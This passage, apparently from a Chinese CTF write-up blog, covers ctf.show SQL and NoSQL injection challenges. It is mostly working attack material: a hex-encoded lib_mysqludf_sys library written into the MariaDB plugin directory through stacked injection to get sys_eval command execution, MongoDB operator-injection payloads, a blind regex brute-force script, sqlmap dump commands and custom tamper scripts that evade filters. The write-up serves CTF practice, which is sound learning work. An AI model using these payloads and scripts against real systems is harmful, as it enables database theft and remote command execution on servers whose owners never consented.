BA2B0000004889CE4889C7E87EFAFFFFB801000000C9C3554889E548897DF8C9C3554889E54881EC500400004889BDD8FBFFFF4889B5D0FBFFFF488995C8FBFFFF48898DC0FBFFFF4C8985B8FBFFFF4C898DB0FBFFFFBF01000000E8BEF9FFFF488985C8FBFFFF48C745F000000000488B85D0FBFFFF488B4010488B00488D352C0200004889C7E852FAFFFF488945E8EB63488D85E0FBFFFF4889C7E8BDF9FFFF488945F8488B45F8488B55F04801C2488B85C8FBFFFF4889D64889C7E80CFAFFFF488985C8FBFFFF488D85E0FBFFFF488B55F0488B8DC8FBFFFF4801D1488B55F84889C64889CFE8D1F9FFFF488B45F8480145F0488B55E8488D85E0FBFFFFBE000400004889C7E831F9FFFF4885C07580488B45E84889C7E850F9FFFF488B85C8FBFFFF0FB60084C0740A4883BDC8FBFFFF00750C488B85B8FBFFFFC60001EB2B488B45F0488B95C8FBFFFF488D0402C60000488B85C8FBFFFF4889C7E8FBF8FFFF488B95C0FBFFFF488902488B85C8FBFFFFC9C39090909090909090554889E5534883EC08488B05A80320004883F8FF7419488D1D9B0320000F1F004883EB08FFD0488B034883F8FF75F14883C4085BC9C390904883EC08E84FF9FFFF4883C408C300004E6F20617267756D656E747320616C6C6F77656420287564663A206C69625F6D7973716C7564665F7379735F696E666F29000000000000006C69625F6D7973716C7564665F7379732076657273696F6E20302E302E33000045787065637465642065786163746C79206F6E6520737472696E67207479706520706172616D6574657200000000000045787065637465642065786163746C792074776F20617267756D656E74730000457870656374656420737472696E67207479706520666F72206E616D6520706172616D6574657200436F756C64206E6F7420616C6C6F63617465206D656D6F7279007200011B033B800000000F00000008F9FFFF9C00000051F9FFFFBC0000005BF9FFFFDC000000A7F9FFFFFC00000004FAFFFF1C0100000EFAFFFF3C01000071FAFFFF5C01000062FBFFFF7C0100008DFBFFFF9C0100005EFCFFFFBC010000C5FCFFFFDC010000CFFCFFFFFC010000FEFCFFFF1C02000065FDFFFF3C0200006FFDFFFF5C0200001400000000000000017A5200017810011B0C0708900100001C0000001C00000064F8FFFF4900000000410E108602430D0602440C070800001C0000003C0000008DF8FFFF0A00000000410E108602430D06450C07080000001C0000005C00000077F8FFFF4C00000000410E108602430D0602470C070800001C0000007C000000A3F8FFFF5D00000000410E108602430D0602580C070800001C0000009C000000E0F8FFFF0A00000000410E108602430D06450C07080000001C000000BC000000CAF8FFFF6300000000410E108602430D06025E0C070800001C000000DC0000000DF9FFFFF100000000410E108602430D0602EC0C070800001C000000FC000000DEF9FFFF2B00000000410E108602430D06660C07080000001C0000001C010000E9F9FFFFD100000000410E108602430D0602CC0C070800001C0000003C0100009AFAFFFF6700000000410E108602430D0602620C070800001C0000005C010000E1FAFFFF0A00000000410E108602430D06450C07080000001C0000007C010000CBFAFFFF2F00000000410E108602430D066A0C07080000001C0000009C010000DAFAFFFF6700000000410E108602430D0602620C070800001C000000BC01000021FBFFFF0A00000000410E108602430D06450C07080000001C000000DC0100000BFBFFFF5501000000410E108602430D060350010C0708000000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF00000000000000000000000000000000F01420000000000001000000000000006F010000000000000C0000000000000088090000000000000D000000000000004811000000000000F5FEFF6F00000000B8010000000000000500000000000000E805000000000000060000000000000070020000000000000A000000000000009D010000000000000B000000000000001800000000000000030000000000000090162000000000000200000000000000380100000000000014000000000000000700000000000000170000000000000050080000000000000700000000000000F0070000000000000800000000000000600000000000000009000000000000001800000000000000FEFFFF6F00000000D007000000000000FFFFFF6F000000000100000000000000F0FFFF6F000000008607000000000000F9FFFF6F0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000F81420000000000000000000000000000000000000000000B609000000000000C609000000000000D609000000000000E609000000000000F609000000000000060A000000000000160A000000000000260A000000000000360A000000000000460A000000000000560A000000000000660A000000000000760A0000000000004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D3429004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D31372900002E73796D746162002E737472746162002E7368737472746162002E6E6F74652E676E752E6275696C642D6964002E676E752E68617368002E64796E73796D002E64796E737472002E676E752E76657273696F6E002E676E752E76657273696F6E5F72002E72656C612E64796E002E72656C612E706C74002E696E6974002E74657874002E66696E69002E726F64617461002E65685F6672616D655F686472002E65685F6672616D65002E63746F7273002E64746F7273002E6A6372002E646174612E72656C2E726F002E64796E616D6963002E676F74002E676F742E706C74002E627373002E636F6D6D656E7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001B0000000700000002000000000000009001000000000000900100000000000024000000000000000000000000000000040000000000000000000000000000002E000000F6FFFF6F0200000000000000B801000000000000B801000000000000B400000000000000030000000000000008000000000000000000000000000000380000000B000000020000000000000070020000000000007002000000000000780300000000000004000000020000000800000000000000180000000000000040000000030000000200000000000000E805000000000000E8050000000000009D0100000000000000000000000000000100000000000000000000000000000048000000FFFFFF6F0200000000000000860700000000000086070000000000004A0000000000000003000000000000000200000000000000020000000000000055000000FEFFFF6F0200000000000000D007000000000000D007000000000000200000000000000004000000010000000800000000000000000000000000000064000000040000000200000000000000F007000000000000F00700000000000060000000000000000300000000000000080000000000000018000000000000006E000000040000000200000000000000500800000000000050080000000000003801000000000000030000000A000000080000000000000018000000000000007800000001000000060000000000000088090000000000008809000000000000180000000000000000000000000000000400000000000000000000000000000073000000010000000600000000000000A009000000000000A009000000000000E0000000000000000000000000000000040000000000000010000000000000007E000000010000000600000000000000800A000000000000800A000000000000C80600000000000000000000000000001000000000000000000000000000000084000000010000000600000000000000481100000000000048110000000000000E000000000000000000000000000000040000000000000000000000000000008A00000001000000020000000000000058110000000000005811000000000000EC0000000000000000000000000000000800000000000000000000000000000092000000010000000200000000000000441200000000000044120000000000008400000000000000000000000000000004000000000000000000000000000000A0000000010000000200000000000000C812000000000000C812000000000000FC01000000000000000000000000000008000000000000000000000000000000AA000000010000000300000000000000C814200000000000C8140000000000001000000000000000000000000000000008000000000000000000000000000000B1000000010000000300000000000000D814200000000000D8140000000000001000000000000000000000000000000008000000000000000000000000000000B8000000010000000300000000000000E814200000000000E8140000000000000800000000000000000000000000000008000000000000000000000000000000BD000000010000000300000000000000F014200000000000F0140000000000000800000000000000000000000000000008000000000000000000000000000000CA000000060000000300000000000000F814200000000000F8140000000000008001000000000000040000000000000008000000000000001000000000000000D3000000010000000300000000000000781620000000000078160000000000001800000000000000000000000000000008000000000000000800000000000000D8000000010000000300000000000000901620000000000090160000000000008000000000000000000000000000000008000000000000000800000000000000E1000000080000000300000000000000101720000000000010170000000000001000000000000000000000000000000008000000000000000000000000000000E60000000100000030000000000000000000000000000000101700000000000059000000000000000000000000000000010000000000000001000000000000001100000003000000000000000000000000000000000000006917000000000000EF00000000000000000000000000000001000000000000000000000000000000010000000200000000000000000000000000000000000000581F00000000000068070000000000001B0000002C00000008000000000000001800000000000000090000000300000000000000000000000000000000000000C02600000000000042030000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000100900100000000000000000000000000000000000003000200B80100000000000000000000000000000000000003000300700200000000000000000000000000000000000003000400E80500000000000000000000000000000000000003000500860700000000000000000000000000000000000003000600D00700000000000000000000000000000000000003000700F00700000000000000000000000000000000000003000800500800000000000000000000000000000000000003000900880900000000000000000000000000000000000003000A00A00900000000000000000000000000000000000003000B00800A00000000000000000000000000000000000003000C00481100000000000000000000000000000000000003000D00581100000000000000000000000000000000000003000E00441200000000000000000000000000000000000003000F00C81200000000000000000000000000000000000003001000C81420000000000000000000000000000000000003001100D81420000000000000000000000000000000000003001200E81420000000000000000000000000000000000003001300F01420000000000000000000000000000000000003001400F81420000000000000000000000000000000000003001500781620000000000000000000000000000000000003001600901620000000000000000000000000000000000003001700101720000000000000000000000000000000000003001800000000000000000000000000000000000100000002000B00800A0000000000000000000000000000110000000400F1FF000000000000000000000000000000001C00000001001000C81420000000000000000000000000002A00000001001100D81420000000000000000000000000003800000001001200E81420000000000000000000000000004500000002000B00A00A00000000000000000000000000005B00000001001700101720000000000001000000000000006A00000001001700181720000000000008000000000000007800000002000B00200B0000000000000000000000000000110000000400F1FF000000000000000000000000000000008400000001001000D01420000000000000000000000000009100000001000F00C01400000000000000000000000000009F00000001001200E8142000000000000000000000000000AB00000002000B0010110000000000000000000000000000C10000000400F1FF00000000000000000000000000000000D40000000100F1FF90162000000000000000000000000000EA00000001001300F0142000000000000000000000000000F700000001001100E0142000000000000000000000000000040100000100F1FFF81420000000000000000000000000000D01000012000B00D10D000000000000D1000000000000001501000012000B00130F0000000000002F000000000000001E01000020000000000000000000000000000000000000002D01000020000000000000000000000000000000000000004101000012000C00481100000000000000000000000000004701000012000B00A90F0000000000000A000000000000005701000012000000000000000000000000000000000000006B01000012000000000000000000000000000000000000007F01000012000B00A20E00000000000067000000000000008D01000012000B00B30F0000000000005501000000000000960100001200000000000000000000000000000000000000A901000012000B00950B0000000000000A00000000000000C601000012000B00B50C000000000000F100000000000000D30100001200000000000000000000000000000000000000E50100001200000000000000000000000000000000000000F901000012000000000000000000000000000000000000000D02000012000B004C0B00000000000049000000000000002802000022000000000000000000000000000000000000004402000012000B00A60D0000000000002B000000000000005302000012000B00EB0B0000000000005D000000000000006002000012000B00480C0000000000000A000000000000006F02000012000000000000000000000000000000000000008302000012000B00420F0000000000006700000000000000910200001200000000000000000000000000000000000000A50200001200000000000000000000000000000000000000B902000012000B00520C0000000000006300000000000000C10200001000F1FF10172000000000000000000000000000CD02000012000B009F0B0000000000004C00000000000000E30200001000F1FF20172000000000000000000000000000E80200001200000000000000000000000000000000000000FD02000012000B00090F0000000000000A000000000000000D0300001200000000000000000000000000000000000000220300001000F1FF101720000000000000000000000000002903000012000000000000000000000000000000000000003C03000012000900880900000000000000000000000000000063616C6C5F676D6F6E5F73746172740063727473747566662E63005F5F43544F525F4C4953545F5F005F5F44544F525F4C4953545F5F005F5F4A43525F4C4953545F5F005F5F646F5F676C6F62616C5F64746F72735F61757800636F6D706C657465642E363335320064746F725F6964782E36333534006672616D655F64756D6D79005F5F43544F525F454E445F5F005F5F4652414D455F454E445F5F005F5F4A43525F454E445F5F005F5F646F5F676C6F62616C5F63746F72735F617578006C69625F6D7973716C7564665F7379732E63005F474C4F42414C5F4F46465345545F5441424C455F005F5F64736F5F68616E646C65005F5F44544F525F454E445F5F005F44594E414D4943007379735F736574007379735F65786563005F5F676D6F6E5F73746172745F5F005F4A765F5265676973746572436C6173736573005F66696E69007379735F6576616C5F6465696E6974006D616C6C6F634040474C4942435F322E322E350073797374656D4040474C4942435F322E322E35007379735F657865635F696E6974007379735F6576616C0066676574734040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974007379735F7365745F696E697400667265654040474C4942435F322E322E35007374726C656E4040474C4942435F322E322E350070636C6F73654040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F696E6974005F5F6378615F66696E616C697A654040474C4942435F322E322E35007379735F7365745F6465696E6974007379735F6765745F696E6974007379735F6765745F6465696E6974006D656D6370794040474C4942435F322E322E35007379735F6576616C5F696E697400736574656E764040474C4942435F322E322E3500676574656E764040474C4942435F322E322E35007379735F676574005F5F6273735F7374617274006C69625F6D7973716C7564665F7379735F696E666F005F656E64007374726E6370794040474C4942435F322E322E35007379735F657865635F6465696E6974007265616C6C6F634040474C4942435F322E322E35005F656461746100706F70656E4040474C4942435F322E322E35005F696E697400&quot;</span><br>payload = []<br>text = [<span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>, <span class="hljs-string">&#x27;5&#x27;</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">21510</span>, <span class="hljs-number">5000</span>):<br>    end = i + <span class="hljs-number">5000</span><br>    payload.append(udf_inhex[i:end])<br><br>p = <span class="hljs-built_in">dict</span>(<span class="hljs-built_in">zip</span>(text, payload))<br><br><span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> text:<br>    url = base_url + <span class="hljs-string">f&quot;?id=&#x27;;select unhex(&#x27;<span class="hljs-subst">&#123;p[t]&#125;</span>&#x27;) into dumpfile &#x27;/usr/lib/mariadb/plugin/<span class="hljs-subst">&#123;t&#125;</span>.txt&#x27;; #&quot;</span><br>    r = requests.get(url)<br>    <span class="hljs-built_in">print</span>(r.status_code)<br><span class="hljs-comment"># 正式写入so文件</span><br>next_url = base_url + <span class="hljs-string">&quot;?id=&#x27;; select concat(load_file(&#x27;/usr/lib/mariadb/plugin/1.txt&#x27;),load_file(&#x27;/usr/lib/mariadb/plugin/2.txt&#x27;),load_file(&#x27;/usr/lib/mariadb/plugin/3.txt&#x27;),load_file(&#x27;/usr/lib/mariadb/plugin/4.txt&#x27;),load_file(&#x27;/usr/lib/mariadb/plugin/5.txt&#x27;)) into dumpfile &#x27;/usr/lib/mariadb/plugin/udf.so&#x27;; #&quot;</span><br>r = requests.get(next_url)<br><span class="hljs-built_in">print</span>(r.status_code)<br><br>udf_url = base_url + <span class="hljs-string">&quot;?id=&#x27;;create function sys_eval returns string soname &#x27;udf.so&#x27;; #&quot;</span><br>r = requests.get(udf_url)<br>final_url = base_url + <span class="hljs-string">&quot;?id=&#x27;;select sys_eval(&#x27;cat /flag*&#x27;); #&quot;</span><br>r = requests.get(final_url)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure>
<ol>
<li>NoSQL注入</li>
</ol>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/97211">https://www.anquanke.com/post/id/97211</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">flag在flag中<br>gt : &gt;<br>$lt : &lt;<br>$gte: &gt;=<br>$lte: &lt;=<br>$ne : !=、&lt;&gt;<br>$in : in<br>$nin: not in<br>$all: all <br>$or:or<br>$not: 反匹配(1.3.3及以上版本)<br>$regex<br></code></pre></td></tr></table></figure>
<p>传参点为id 无过滤</p>
<p class='item-img' data-src='/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220904094011826.png'><img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220904094011826.png" alt="image-20220904094011826"></p>
<p class='item-img' data-src='/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220904094042843.png'><img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220904094042843.png" alt="image-20220904094042843" style="zoom:50%;"></p>
<p>这里可以利用重演式攻击，通过传递数组的方式来进行注入</p>
<p><strong>payload:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id[$in]=flag<br></code></pre></td></tr></table></figure>
<ol>
<li><p>NoSQL注入</p>
<p>题面<img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220904094728417.png" alt="image-20220904094728417"></p>
</li>
</ol>
<p>返回逻辑，也就是登录成功即可爆出flag</p>
<p class='item-img' data-src='/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220904094746919.png'><img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220904094746919.png" alt="image-20220904094746919" style="zoom:50%;"></p>
<p>POST传参，参数点为username和password</p>
<p class='item-img' data-src='/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220904094832405.png'><img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220904094832405.png" alt="image-20220904094832405" style="zoom:50%;"></p>
<p>和上题的思路一致，（就是那个执行语句比较抽象），重演式注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">username[$ne]=&amp;password[$ne]=<br></code></pre></td></tr></table></figure>
<ol>
<li><p>NoSQL注入</p>
<p>这题的题面和上一关没有变化，注入进去后并没有爆出flag </p>
<p class='item-img' data-src='/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220904095426729.png'><img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220904095426729.png" alt="image-20220904095426729"></p>
</li>
</ol>
<p>离谱，说明这题是不想让我们以admin用户名登录进去</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">username[$ne]=admin&amp;password[$ne]=<br></code></pre></td></tr></table></figure>
<ol>
<li><p>NoSQL注入</p>
<p>可以看到题面发生了变化</p>
<p class='item-img' data-src='/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220904095754985.png'><img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220904095754985.png" alt="image-20220904095754985" style="zoom:50%;"></p>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">mongodb的find().pretty()方法的作用。<br>使得查询出来的数据在命令行中更加美观的显示，不至于太紧凑<br></code></pre></td></tr></table></figure>
<p>沿用上一关的payload，发现又多出来个admin1。。。试试正则绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">username[$regex]=^[^admin].*$&amp;password[$ne]=<br>[^xyz] 匹配未包含的任意字符<br></code></pre></td></tr></table></figure>
<ol>
<li><p><strong>NoSQL注入</strong></p>
<p>这关和上一关题面一致，但是payload打不通了。应该是<strong>盲注</strong>，利用正则匹配出flag来</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding=gbk</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br>db = string.ascii_lowercase + string.digits + <span class="hljs-string">&#x27;_-&#123;&#125;&#x27;</span><br><br>url = <span class="hljs-string">&quot;http://637fc69e-5c8f-4c57-b062-92e7fbddff28.challenge.ctf.show/api/&quot;</span><br><br>flag = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> db:<br>        payload = <span class="hljs-string">f&quot;^<span class="hljs-subst">&#123;flag+s&#125;</span>.*$&quot;</span><br>        data = &#123;<br>            <span class="hljs-string">&quot;username[$regex]&quot;</span>:<span class="hljs-string">&#x27;flag&#x27;</span>,<br>            <span class="hljs-string">&quot;password[$regex]&quot;</span>:payload<br>        &#125;<br>        r = requests.post(url, data=data)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">r&quot;\u767b\u9646\u6210\u529f&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>            flag += s<br>            <span class="hljs-built_in">print</span>(flag)<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;&#125;&#x27;</span> <span class="hljs-keyword">in</span> flag:<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>
</li>
</ol>
<pre><code> 后面补充下中间sqlmap部分的内容

 205. sqlmap

      <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">sqlmap -u &quot;http://1b66a511-986d-46af-8397-9f8a76a4ff43.challenge.ctf.show/api/index.php&quot; --safe-url=&quot;http://1b66a511-986d-46af-8397-9f8a76a4ff43.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --method=&quot;PUT&quot; --data=&quot;id=1&quot; --headers=&quot;Content-Type: text/plain;&quot; --refer=&quot;ctf.show&quot; -dbms mysql -D ctfshow_web -T ctfshow_flax  -C &quot;flagx,tes&quot; --dump<br></code></pre></td></tr></table></figure>

 206. sqlmap 发现上面的payload还能用。它想考一个闭合，但是sqlmap可以自动检测

      <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">sqlmap -u &quot;http://53dc3fcd-908e-4457-9c27-580bcff8fff8.challenge.ctf.show/api/index.php&quot; --safe-url=&quot;http://53dc3fcd-908e-4457-9c27-580bcff8fff8.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --method=&quot;PUT&quot; --data=&quot;id=1&quot; --headers=&quot;Content-Type: text/plain;&quot; --refer=&quot;ctf.show&quot; -dbms mysql -D ctfshow_web -T ctfshow_flaxc -C &quot;flagv,tes&quot; --dump<br></code></pre></td></tr></table></figure>

 207. sqlmap 使用tamper脚本来绕过一些过滤

      这道题过滤了空格，所以我们可以使用内置脚本space2comment.py（其会利用/**/来绕过空格）

      <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">sqlmap -u &quot;http://0a585485-b04b-4bbf-8efc-29442e7846f1.challenge.ctf.show/api/index.php&quot; --safe-url=&quot;http://0a585485-b04b-4bbf-8efc-29442e7846f1.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --method=&quot;PUT&quot; --data=&quot;id=1&quot; --headers=&quot;Content-Type: text/plain;&quot; --refer=&quot;ctf.show&quot; -dbms mysql --tamper=space2comment.py  -D ctfshow_web -T ctfshow_flaxca -C &quot;flagvc&quot; --dump<br></code></pre></td></tr></table></figure>

 208. sqlmap 这道题过滤了空格和关键词`select`

      打算自己写个脚本

      <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-keyword">from</span> lib.core.compat <span class="hljs-keyword">import</span> xrange<br><span class="hljs-keyword">from</span> lib.core.enums <span class="hljs-keyword">import</span> PRIORITY<br>__priority__ = PRIORITY.LOW<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dependencies</span>():<br>    <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">tamper</span>(<span class="hljs-params">payload, **kwargs</span>):<br>    retVal = payload<br><br>    <span class="hljs-keyword">if</span> payload:<br>        retVal = <span class="hljs-string">&quot;&quot;</span><br>        quote, doublequote, firstspace = <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span><br><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-built_in">len</span>(payload)):<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> firstspace:<br>                <span class="hljs-keyword">if</span> payload[i].isspace():<br>                    firstspace = <span class="hljs-literal">True</span><br>                    retVal += <span class="hljs-string">&quot;/**/&quot;</span><br>                    <span class="hljs-keyword">continue</span><br><br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&#x27;\&#x27;&#x27;</span>:<br>                quote = <span class="hljs-keyword">not</span> quote<br><br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&#x27;&quot;&#x27;</span>:<br>                doublequote = <span class="hljs-keyword">not</span> doublequote<br><br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&quot; &quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> doublequote <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> quote:<br>                retVal += <span class="hljs-string">&quot;/**/&quot;</span><br>                <span class="hljs-keyword">continue</span><br><br>            retVal += payload[i]<br>        <span class="hljs-comment"># 就加了下面一行替换</span><br>        retVal = retVal.replace(<span class="hljs-string">&quot;select&quot;</span>, <span class="hljs-string">&quot;sselectelect&quot;</span>)<br><br>    <span class="hljs-keyword">return</span> retVal<br></code></pre></td></tr></table></figure>

      <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">sqlmap -u &quot;http://66af8c09-8165-4f2f-b817-45701578d5eb.challenge.ctf.show/api/index.php&quot; --safe-url=&quot;http://66af8c09-8165-4f2f-b817-45701578d5eb.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --method=&quot;PUT&quot; --data=&quot;id=1&quot; --headers=&quot;Content-Type: text/plain;&quot; --refer=&quot;ctf.show&quot; -dbms mysql --tamper=ctfshow208.py -D ctfshow_web -T ctfshow_flaxcac -C &quot;flagvca&quot; --dump<br></code></pre></td></tr></table></figure>

      209. sqlmap 过滤了空格，内行注释和等号

           还是需要去修改脚本

           对于空格 我们可以使用`%09`绕过，对于`=`可以换成like关键字

           还是对sqlmap的传参过程不是很清晰，这里竟然可以直接用python的chr()函数作替换

           <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">from</span> lib.core.compat <span class="hljs-keyword">import</span> xrange<br><span class="hljs-keyword">from</span> lib.core.enums <span class="hljs-keyword">import</span> PRIORITY<br><br>__priority__ = PRIORITY.LOW<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dependencies</span>():<br>    <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">tamper</span>(<span class="hljs-params">payload, **kwargs</span>):<br><br>    retVal = payload<br><br>    <span class="hljs-keyword">if</span> payload:<br>        retVal = <span class="hljs-string">&quot;&quot;</span><br>        quote, doublequote, firstspace = <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span><br><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-built_in">len</span>(payload)):<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> firstspace:<br>                <span class="hljs-keyword">if</span> payload[i].isspace():<br>                    firstspace = <span class="hljs-literal">True</span><br>                    retVal += <span class="hljs-built_in">chr</span>(<span class="hljs-number">0x9</span>)<br>                    <span class="hljs-keyword">continue</span><br><br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&#x27;\&#x27;&#x27;</span>:<br>                quote = <span class="hljs-keyword">not</span> quote<br><br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&#x27;&quot;&#x27;</span>:<br>                doublequote = <span class="hljs-keyword">not</span> doublequote<br><br>            <span class="hljs-keyword">elif</span> payload[i] 